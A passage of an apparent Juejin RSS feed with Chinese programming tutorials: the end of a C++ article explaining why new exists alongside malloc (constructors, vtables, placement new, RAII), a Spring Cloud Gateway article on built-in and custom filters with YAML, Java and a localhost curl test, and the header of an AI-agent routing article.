<h3 data-id="heading-7">构造函数的特殊性</h3>
<p>构造函数在C++中是一个<strong>特殊的存在</strong>，它：</p>
<ol>
<li><strong>没有名字可以调用</strong>：你不能像普通函数那样调用<code>obj.Constructor()</code></li>
<li><strong>没有返回值</strong>：甚至不是void类型</li>
<li><strong>自动调用机制</strong>：只在对象创建时由编译器自动安排调用</li>
</ol>
<p><strong>设计哲学</strong>：构造函数是对象"诞生"的时刻，这个时刻应该由语言机制保证，而不是程序员手动控制。</p>
<h3 data-id="heading-8">虚函数表的秘密</h3>
<p>对于有虚函数的类，问题更严重：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Animal</span>() {}
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> : <span class="hljs-keyword">public</span> Animal {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ cout &lt;&lt; <span class="hljs-string">"汪汪！\n"</span>; }
};

<span class="hljs-comment">// 危险的尝试：</span>
Animal* a = (Animal*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Dog));
a-&gt;<span class="hljs-built_in">speak</span>();  <span class="hljs-comment">// 灾难！虚函数表指针未初始化</span>
</code></pre>
<p>每个有虚函数的对象都有一个隐藏的<strong>虚函数表指针</strong>，这个指针必须在构造函数中初始化。<code>malloc</code>完全不知道这个指针的存在，而<code>new</code>会正确处理。</p>
<h2 data-id="heading-9">第四章：手动构造的桥梁——placement new</h2>
<h3 data-id="heading-10">发现解决方案</h3>
<p>既然不能直接调用构造函数，C++提供了<strong>placement new</strong>这个机制：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span>  <span class="hljs-comment">// 必须包含这个头文件</span></span>

<span class="hljs-type">void</span>* memory = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Student));
Student* s = <span class="hljs-built_in">new</span>(memory) <span class="hljs-built_in">Student</span>(<span class="hljs-string">"赵六"</span>, <span class="hljs-number">23</span>);  <span class="hljs-comment">// placement new！</span>
</code></pre>
<p><strong>这是什么魔法？</strong> <code>new(memory)</code>的意思是："在<code>memory</code>指向的内存位置上构造一个对象"。</p>
<h3 data-id="heading-11">完整的手动管理流程</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 1. 分配原始内存</span>
<span class="hljs-type">void</span>* raw_mem = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Student));

<span class="hljs-comment">// 2. 在内存上构造对象</span>
Student* student = <span class="hljs-built_in">new</span>(raw_mem) <span class="hljs-built_in">Student</span>(<span class="hljs-string">"钱七"</span>, <span class="hljs-number">24</span>);

<span class="hljs-comment">// 3. 使用对象</span>
cout &lt;&lt; student-&gt;name &lt;&lt; <span class="hljs-string">" "</span> &lt;&lt; student-&gt;age &lt;&lt; endl;

<span class="hljs-comment">// 4. 手动调用析构函数</span>
student-&gt;~<span class="hljs-built_in">Student</span>();

<span class="hljs-comment">// 5. 释放内存</span>
<span class="hljs-built_in">free</span>(raw_mem);
</code></pre>
<h3 data-id="heading-12">有趣的现象：为什么析构函数可以手动调用？</h3>
<p>你可能注意到了，我们可以手动调用析构函数<code>student-&gt;~Student()</code>，但不能手动调用构造函数。这是因为：</p>
<ul>
<li><strong>析构函数</strong>是一个普通的成员函数，只是名字特殊</li>
<li><strong>构造函数</strong>是语言级别的特殊机制，不是普通函数</li>
</ul>
<h2 data-id="heading-13">第五章：设计哲学——为什么C++要这样设计？</h2>
<h3 data-id="heading-14">异常安全保证</h3>
<p>考虑这个场景：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceHolder</span> {
    FILE* file;
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">ResourceHolder</span>(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename) {
        file = <span class="hljs-built_in">fopen</span>(filename, <span class="hljs-string">"r"</span>);
        <span class="hljs-keyword">if</span> (!file) <span class="hljs-keyword">throw</span> <span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">"文件打开失败"</span>);
        <span class="hljs-comment">// 可能还有其他可能抛出异常的操作</span>
    }
    ~<span class="hljs-built_in">ResourceHolder</span>() {
        <span class="hljs-keyword">if</span> (file) <span class="hljs-built_in">fclose</span>(file);
    }
};

<span class="hljs-comment">// 使用new：异常安全</span>
<span class="hljs-keyword">try</span> {
    ResourceHolder* rh = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ResourceHolder</span>(<span class="hljs-string">"data.txt"</span>);
    <span class="hljs-comment">// 如果构造失败，new保证内存被释放</span>
    <span class="hljs-keyword">delete</span> rh;
} <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> exception&amp; e) {
    <span class="hljs-comment">// 安全处理异常</span>
}

<span class="hljs-comment">// 如果允许malloc+手动构造：</span>
ResourceHolder* rh = (ResourceHolder*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(ResourceHolder));
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 假设我们可以手动调用构造函数</span>
    rh-&gt;<span class="hljs-built_in">ResourceHolder</span>(<span class="hljs-string">"data.txt"</span>);  <span class="hljs-comment">// 可能抛出异常</span>
} <span class="hljs-built_in">catch</span> (...) {
    <span class="hljs-built_in">free</span>(rh);  <span class="hljs-comment">// 容易忘记这个清理！</span>
    <span class="hljs-keyword">throw</span>;
}
</code></pre>
<p><strong>关键洞察</strong>：<code>new</code>提供了<strong>原子性操作</strong>——要么对象完整创建，要么完全失败且没有资源泄漏。</p>
<h3 data-id="heading-15">RAII原则</h3>
<p>RAII（Resource Acquisition Is Initialization）是C++的核心设计模式：</p>
<ul>
<li><strong>资源获取</strong>就是<strong>初始化</strong></li>
<li>构造函数获取资源</li>
<li>析构函数释放资源</li>
</ul>
<p><code>new</code>/<code>delete</code>完美支持RAII，而<code>malloc</code>/<code>free</code>需要手动管理所有细节。</p>
<h2 data-id="heading-16">第六章：实际应用——何时使用何种方式？</h2>
<h3 data-id="heading-17">现代C++的推荐实践</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ✅ 情况1：创建单个对象——使用new</span>
<span class="hljs-keyword">auto</span>* obj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">MyClass</span>(args);

<span class="hljs-comment">// ✅ 情况2：创建对象数组——使用new[]</span>
<span class="hljs-keyword">auto</span>* arr = <span class="hljs-keyword">new</span> MyClass[<span class="hljs-number">10</span>];

<span class="hljs-comment">// ✅ 情况3：需要自定义内存位置——使用placement new</span>
<span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];
<span class="hljs-keyword">auto</span>* obj = <span class="hljs-built_in">new</span>(buffer) <span class="hljs-built_in">MyClass</span>(args);

<span class="hljs-comment">// ⚠️ 情况4：与C库交互——可以使用malloc</span>
<span class="hljs-type">void</span>* data = <span class="hljs-built_in">malloc</span>(size);
<span class="hljs-built_in">c_library_function</span>(data);
<span class="hljs-built_in">free</span>(data);

<span class="hljs-comment">// ❌ 大多数现代C++代码中：避免直接使用new</span>
<span class="hljs-comment">// 改用智能指针：</span>
<span class="hljs-keyword">auto</span> obj = <span class="hljs-built_in">make_unique</span>&lt;MyClass&gt;(args);  <span class="hljs-comment">// 更安全！</span>
</code></pre>
<h3 data-id="heading-18">性能考虑：真的需要担心吗？</h3>
<p>很多人担心<code>new</code>比<code>malloc</code>慢，但实际上：</p>
<ol>
<li>对于需要初始化的对象，<code>malloc</code>需要额外的初始化步骤</li>
<li>编译器可以对<code>new</code>进行深度优化</li>
<li>真正的性能瓶颈很少是内存分配本身</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 性能测试对比</span>
<span class="hljs-keyword">auto</span> start = chrono::high_resolution_clock::<span class="hljs-built_in">now</span>();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
    <span class="hljs-keyword">auto</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ComplexObject</span>(<span class="hljs-string">"test"</span>);
    <span class="hljs-keyword">delete</span> p;
}
<span class="hljs-keyword">auto</span> end = chrono::high_resolution_clock::<span class="hljs-built_in">now</span>();

<span class="hljs-comment">// 通常差异小于10%，而安全性提升是巨大的</span>
</code></pre>
<h2 data-id="heading-19">第七章：从汇编层面看差异</h2>
<p>让我们看看编译器实际生成了什么代码：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++源代码：</span>
<span class="hljs-function">Student* <span class="hljs-title">create</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Student</span>(<span class="hljs-string">"小明"</span>, <span class="hljs-number">18</span>);
}

<span class="hljs-comment">// 编译器生成的伪汇编（x64）：</span>
<span class="hljs-built_in">create</span>():
    push    rbx
    mov     edi, <span class="hljs-number">40</span>          <span class="hljs-meta"># sizeof(Student)，编译器自动计算</span>
    call    <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>     # <span class="hljs-number">1.</span> 分配内存
    
    mov     rbx, rax         # 保存指针
    mov     rdi, rbx         # 传递<span class="hljs-keyword">this</span>指针
    mov     esi, 地址_of_<span class="hljs-string">"小明"</span>  # 传递name参数
    mov     edx, <span class="hljs-number">18</span>          # 传递age参数
    call    Student构造函数   # <span class="hljs-number">2.</span> 调用构造函数！关键步骤！
    
    mov     rax, rbx         # 返回对象指针
    pop     rbx
    ret
</code></pre>
<p><strong>关键点</strong>：构造函数调用是编译器<strong>直接插入</strong>的，不是运行时查找的。</p>
<h2 data-id="heading-20">选择哪种方式？为什么？</h2>
<h3 data-id="heading-21">终极答案</h3>
<p><code>malloc</code>和<code>new</code>代表了两种不同的编程哲学：</p>






























<table><thead><tr><th>特性</th><th><code>malloc</code>/<code>free</code></th><th><code>new</code>/<code>delete</code></th></tr></thead><tbody><tr><td><strong>哲学</strong></td><td>C：分离关注点</td><td>C++：对象完整性</td></tr><tr><td><strong>视角</strong></td><td>内存分配器</td><td>对象生命周期管理器</td></tr><tr><td><strong>职责</strong></td><td>只给空地</td><td>给地+建房+装修</td></tr><tr><td><strong>安全</strong></td><td>程序员全责</td><td>语言提供保证</td></tr></tbody></table>
<h3 data-id="heading-22">现代C++的最佳实践</h3>
<ol>
<li><strong>默认使用new/delete</strong>——当你需要创建对象时</li>
<li><strong>优先使用智能指针</strong>——避免手动内存管理</li>
<li><strong>仅在必要时用malloc</strong>——与C库交互、实现内存池等低级操作</li>
<li><strong>理解背后的原理</strong>——即使使用高级工具，也要知道底层机制</li>
</ol>
<h3 data-id="heading-23">最后的思考</h3>
<p>回到最初的问题：<strong>为什么C++有了malloc还需要new？</strong></p>
<p>因为C++不仅仅是要分配内存，更是要管理<strong>对象的完整生命周期</strong>。<code>new</code>不是<code>malloc</code>的替代品，而是C++面向对象哲学的体现——它将内存分配、对象构造、异常安全、类型系统完美地结合在一起。</p>
<p>当你使用<code>new</code>时，你不仅是在分配内存，更是在告诉编译器："请为我创建一个完整的、类型安全的、异常安全的对象。" 这就是C++的力量所在，也是它区别于C的本质特征。</p>
<p>记住：在C++中，我们不是操作内存，我们是管理对象。这个理念的转变，正是从<code>malloc</code>到<code>new</code>跨越的核心。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[006-spring cloud alibaba之gateway网关-过滤器Filter]]></title>    <link>https://juejin.cn/post/7592960378689929251</link>    <guid>https://juejin.cn/post/7592960378689929251</guid>    <pubDate>2026-01-09T06:42:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592960378689929251" data-draft-id="7592912361302851619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="006-spring cloud alibaba之gateway网关-过滤器Filter"/> <meta itemprop="keywords" content="微服务"/> <meta itemprop="datePublished" content="2026-01-09T06:42:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="超级小猪"/> <meta itemprop="url" content="https://juejin.cn/user/3702810891008525"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            006-spring cloud alibaba之gateway网关-过滤器Filter
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810891008525/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    超级小猪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:42:46.000Z" title="Fri Jan 09 2026 06:42:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">gateway过滤器</h2>
<p>过滤器作用在路由内部，体现在配置上就是Filter配置在routes下面。比如</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">user</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://user</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/cjxz/**</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">After=2026-01-10T21:40:10.529+08:00[Asia/Shanghai]</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">StripPrefix=1</span> <span class="hljs-comment"># 去掉第一个路径：/cjxz/</span>
</code></pre>
<p>上面的filters就是一个过滤器。过滤器的作用就是允许修改传入HTTP请求或者传出HTTP响应。大白话就是filters可以修改http的入参，也可以修改http出参。gateway自带很多过滤器。比如上面使用StripPrefix就是其中一个，作用就是去掉路径中的第一个参数。下面举几个自带的过滤器使用。更多的过滤器可以去官网阅读一下，了解大概有哪些过滤器。在实际应用中遇到在去学习也可以。</p>
<h3 data-id="heading-1">RequestSize请求大小的过滤器</h3>
<h4 data-id="heading-2">RequestSize的配置</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">user</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://user</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/cjxz/**</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">After=2026-01-10T21:40:10.529+08:00[Asia/Shanghai]</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">StripPrefix=1</span> <span class="hljs-comment"># 去掉第一个路径：/cjxz/</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">RequestSize</span>
              <span class="hljs-attr">args:</span>
                <span class="hljs-string">maxSize:5000</span>
</code></pre>
<h4 data-id="heading-3">测试方法</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/upload"</span>)
    public String <span class="hljs-built_in">uploadFile</span>(<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">"file"</span>) MultipartFile file) {
        <span class="hljs-selector-tag">if</span> (file.<span class="hljs-built_in">isEmpty</span>()) {
            <span class="hljs-selector-tag">return</span> "请选择要上传的文件";
        }

        <span class="hljs-selector-tag">try</span> {
            <span class="hljs-comment">// 创建上传目录（如果不存在）</span>
            <span class="hljs-selector-tag">Path</span> <span class="hljs-selector-tag">uploadPath</span> = <span class="hljs-selector-tag">Paths</span><span class="hljs-selector-class">.get</span>(UPLOAD_DIR);
            <span class="hljs-selector-tag">if</span> (!Files.<span class="hljs-built_in">exists</span>(uploadPath)) {
                <span class="hljs-selector-tag">Files</span><span class="hljs-selector-class">.createDirectories</span>(uploadPath);
            }

            <span class="hljs-comment">// 生成唯一文件名，防止覆盖</span>
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">originalFilename</span> = <span class="hljs-selector-tag">file</span><span class="hljs-selector-class">.getOriginalFilename</span>();
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">fileExtension</span> = "";
            <span class="hljs-selector-tag">if</span> (originalFilename != null &amp;&amp; originalFilename.<span class="hljs-built_in">contains</span>(<span class="hljs-string">"."</span>)) {
                <span class="hljs-selector-tag">fileExtension</span> = <span class="hljs-selector-tag">originalFilename</span><span class="hljs-selector-class">.substring</span>(originalFilename.<span class="hljs-built_in">lastIndexOf</span>(<span class="hljs-string">"."</span>));
            }
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">uniqueFilename</span> = <span class="hljs-selector-tag">UUID</span><span class="hljs-selector-class">.randomUUID</span>()<span class="hljs-selector-class">.toString</span>() + <span class="hljs-selector-tag">fileExtension</span>;

            <span class="hljs-comment">// 保存文件</span>
            <span class="hljs-selector-tag">Path</span> <span class="hljs-selector-tag">filePath</span> = <span class="hljs-selector-tag">uploadPath</span><span class="hljs-selector-class">.resolve</span>(uniqueFilename);
            <span class="hljs-selector-tag">Files</span><span class="hljs-selector-class">.copy</span>(file.<span class="hljs-built_in">getInputStream</span>(), filePath);

            <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">String</span><span class="hljs-selector-class">.format</span>(<span class="hljs-string">"文件上传成功！\n"</span> +
                            <span class="hljs-string">"原始文件名：%s\n"</span> +
                            <span class="hljs-string">"保存文件名：%s\n"</span> +
                            <span class="hljs-string">"文件大小：%d bytes\n"</span> +
                            <span class="hljs-string">"保存路径：%s"</span>,
                    originalFilename,
                    uniqueFilename,
                    file.<span class="hljs-built_in">getSize</span>(),
                    filePath.<span class="hljs-built_in">toAbsolutePath</span>().<span class="hljs-built_in">toString</span>());

        } <span class="hljs-selector-tag">catch</span> (IOException e) {
            <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();
            <span class="hljs-selector-tag">return</span> "文件上传失败：" + <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.getMessage</span>();
        }
    }
</code></pre>
<h4 data-id="heading-4">测试</h4>
<p>调用接口，上传一个较大的文件提示错误</p>
<pre><code class="hljs language-vbscript" lang="vbscript"><span class="hljs-number">413</span>Payload Too Large请求体过大
请求内容过大，服务器无法处理
<span class="hljs-built_in">Request</span> size <span class="hljs-keyword">is</span> larger than permissible limit. <span class="hljs-built_in">Request</span> size <span class="hljs-keyword">is</span> <span class="hljs-number">13.5</span> MB where permissible limit <span class="hljs-keyword">is</span> <span class="hljs-number">5.0</span> kB

</code></pre>
<h3 data-id="heading-5">AddRequestHeader过滤器</h3>
<p>使用配置</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">user</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://user</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/cjxz/**</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">After=2026-01-10T21:40:10.529+08:00[Asia/Shanghai]</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">StripPrefix=1</span> <span class="hljs-comment"># 去掉第一个路径：/cjxz/</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">RequestSize</span>
              <span class="hljs-attr">args:</span>
                <span class="hljs-string">maxSize:5000</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">AddRequestHeader=X-Request-red,</span> <span class="hljs-string">blue</span>
</code></pre>
<p>请求localhost:9999/cjxz/hello转发到user服务中，会增加RequestHeader参数：X-Request-red=blue</p>
<h3 data-id="heading-6">自定义过滤器</h3>
<p>自定义过滤器需要实现<code>GlobalFilter</code>和<code>Ordered</code>。下面是自定义过滤器的例子</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">GlobalFilter</span>, Ordered {
    <span class="hljs-comment">// 拦截器执行顺序，返回的int越小，在拦截器链路中越靠前</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Mono&lt;Void&gt; <span class="hljs-title function_">filter</span><span class="hljs-params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> {
        System.out.println(<span class="hljs-string">"进入过滤器.."</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> exchange.getRequest().getQueryParams().getFirst(<span class="hljs-string">"userName"</span>);
        <span class="hljs-keyword">if</span>(StringUtils.hasLength(userName)){
            <span class="hljs-keyword">return</span> chain.filter(exchange);
        }
        <span class="hljs-comment">// 没有userName直接结束</span>
        System.out.println(<span class="hljs-string">"非法请求..."</span>);
        exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);
        <span class="hljs-keyword">return</span> exchange.getResponse().setComplete();
    }
}
</code></pre>
<p>验证结果。访问：localhost:9999/cjxz/hello，不携带参数。</p>
<pre><code class="hljs">406Not Acceptable不可接受
服务器在进行“服务器驱动的内容协商”后，找不到任何相关内容
</code></pre>
<p>带参数访问</p>
<pre><code class="hljs language-css" lang="css">curl <span class="hljs-attr">--location</span> <span class="hljs-attr">--request</span> GET 'localhost:<span class="hljs-number">9999</span>/cjxz/hello?userName=<span class="hljs-number">112</span><span class="hljs-string">' \
--header '</span>reqId: <span class="hljs-number">8786768786767878</span><span class="hljs-string">'
</span></code></pre>
<p>响应结果</p>
<pre><code class="hljs">hello xxx ...9002
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent 架构核心：如何构建多意图路由与动态查询分发引擎]]></title>    <link>https://juejin.cn/post/7592944032773816371</link>    <guid>https://juejin.cn/post/7592944032773816371</guid>    <pubDate>2026-01-09T06:55:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592944032773816371" data-draft-id="7592996072705867826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent 架构核心：如何构建多意图路由与动态查询分发引擎"/> <meta itemprop="keywords" content="LLM"/> 